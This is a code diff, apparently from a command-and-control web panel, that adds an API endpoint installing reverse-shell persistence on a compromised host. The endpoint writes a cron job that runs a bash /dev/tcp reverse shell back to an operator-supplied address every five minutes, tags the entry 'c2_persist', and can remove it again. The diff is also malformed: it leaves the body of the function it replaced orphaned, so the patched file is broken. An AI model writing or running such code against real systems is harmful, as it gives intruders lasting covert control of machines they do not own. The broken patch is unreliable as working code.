@@ -1210,9 +1210,92 @@ def clear_shell_history(shell_id: int):
     return jsonify({"success": True})
 
 
-@main_bp.route("/api/shell-execute/<int:shell_id>", methods=["POST"])
+@main_bp.route("/api/shell-persistence/<int:shell_id>", methods=["POST"])
 @login_required
-def shell_execute_api(shell_id: int):
+def shell_persistence_api(shell_id: int):
+    """Enable or remove persistence on a reverse shell.
+
+    Enables: creates a cron job or systemd user timer that re-runs a
+    reconnecting reverse shell payload periodically.
+    Removes: deletes the cron entry / timer created above.
+    """
+    shell = db.session.get(ReverseShell, shell_id)
+    if not shell:
+        return jsonify({"success": False, "error": "Shell not found"}), 404
+
+    listener = get_listener(current_app._get_current_object())
+    if shell_id not in listener.get_active_shells():
+        return jsonify({"success": False, "error": "Shell is not connected"}), 503
+
+    data = request.get_json() or {}
+    action = data.get("action", "enable")  # 'enable' or 'remove'
+    lhost = data.get("lhost", "")
+    lport = data.get("lport", "")
+
+    if action == "enable" and (not lhost or not lport):
+        return jsonify({"success": False, "error": "lhost and lport are required to enable persistence"}), 400
+
+    conn = listener.connections.get(shell_id)
+    if not conn or not conn.is_active:
+        return jsonify({"success": False, "error": "Shell connection not active"}), 503
+
+    try:
+        if action == "enable":
+            # Build a persistence payload that works across common scenarios
+            payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
+            cron_line = f"*/5 * * * * {payload} 2>/dev/null"
+            # Add to crontab (idempotent — remove old entry first, then add)
+            cmd = (
+                f"(crontab -l 2>/dev/null | grep -v 'c2_persist'; "
+                f"echo '# c2_persist'; "
+                f"echo '{cron_line} # c2_persist') | crontab - 2>/dev/null && echo 'PERSIST_OK'"
+            )
+        else:
+            # Remove persistence
+            cmd = (
+                "(crontab -l 2>/dev/null | grep -v 'c2_persist' | crontab - 2>/dev/null) && echo 'PERSIST_REMOVED'"
+            )
+
+        conn.conn.settimeout(10)
+        conn.conn.sendall((cmd + "\n").encode("utf-8"))
+
+        import time as _time
+        _time.sleep(2)
+
+        output = ""
+        conn.conn.settimeout(1)
+        try:
+            while True:
+                chunk = conn.conn.recv(4096)
+                if not chunk:
+                    break
+                output += chunk.decode("utf-8", errors="replace")
+        except Exception:
+            pass
+
+        conn.conn.settimeout(30)
+
+        if action == "enable":
+            ok = "PERSIST_OK" in output
+        else:
+            ok = "PERSIST_REMOVED" in output
+
+        return jsonify({
+            "success": ok,
+            "action": action,
+            "output": output,
+            "message": (
+                "Persistence enabled — cron job will reconnect every 5 minutes"
+                if action == "enable" and ok
+                else "Persistence removed" if action == "remove" and ok
+                else "Command executed but result could not be confirmed"
+            ),
+        })
+    except Exception as exc:
+        return jsonify({"success": False, "error": str(exc)}), 500
+
+
+
     """Execute a command on a reverse shell via JSON API (used by interactive terminal)."""
     shell = db.session.get(ReverseShell, shell_id)
     if not shell:
